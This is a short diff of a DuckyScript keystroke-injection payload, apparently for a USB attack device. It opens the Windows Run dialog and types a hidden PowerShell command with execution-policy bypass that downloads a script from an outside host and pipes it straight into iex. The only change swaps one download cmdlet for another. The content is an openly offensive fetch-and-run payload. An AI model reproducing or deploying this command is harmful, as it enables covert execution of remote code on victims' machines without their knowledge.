@@ -11,6 +11,6 @@ REM     Also remember to replace ?dl=0 with ?dl=1 at the end of your link so it 
 REM
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass $wav='';iwr https://jakoby.lol/vus | iex
+STRING powershell -w h -NoP -NonI -Ep Bypass $wav='';irm https://jakoby.lol/vus | iex
 DELAY 500
 ENTER
